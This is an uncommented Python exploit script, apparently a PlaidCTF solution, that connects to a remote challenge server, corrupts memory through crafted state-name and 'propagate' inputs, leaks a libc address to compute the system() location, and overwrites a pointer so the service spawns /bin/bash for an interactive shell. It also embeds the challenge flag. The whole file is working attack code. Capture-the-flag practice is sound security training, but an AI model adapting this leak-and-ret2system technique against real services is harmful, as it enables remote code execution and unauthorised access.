from pwnlib import *

# PCTF{pr3pr0cess0rMacr0s@areFuture}

state1_name = ""

target = 0x804b02c

state2_name = "\x00"*504
state2_name += pd(target + 8)


announcement = "A"*1022

#s = Socket(("localhost", 5553))
s = Socket(("pound.pwning.xxx", 9765))

s.send("2\n")


s.ru("Size:")
s.send("N+N\n")
s.ru("Size:")
s.send("N+N\n")
s.ru("...")



################


s.ru("name of the first state:")
s.send(state1_name + "\n")

s.ru("name of the second state:")
s.send(state2_name.ljust(512, chr(0)))

def c():
	return s.ru("Enter Your Choice: ")

print c(); s.send("\n"); c()



s.send("2\n")
s.ru("amount to propagate: ")
s.send("%d\n" % (target + 8))

s.send("2\n")
s.ru("amount to propagate: ")
s.send("%d\n" % (target + 8))

s.send("2\n")
s.ru("amount to propagate: ")
s.send("%d\n" % (8))

s.send("0\n")
s.ru("PSA: ")
leaked = ud(s.ru("\n")[:4].ljust(4, chr(0)))
libc_base = leaked - 0x55be0
system = libc_base + 0x3fcd0
assert libc_base & 0xfff == 0

c()


s.send("4\n")
s.ru("ment: ")
s.send("5")
s.send(pd(system) + "/bin/bash \n")
s.send(pd(system) + "/bin/bash \n")










s.interact()

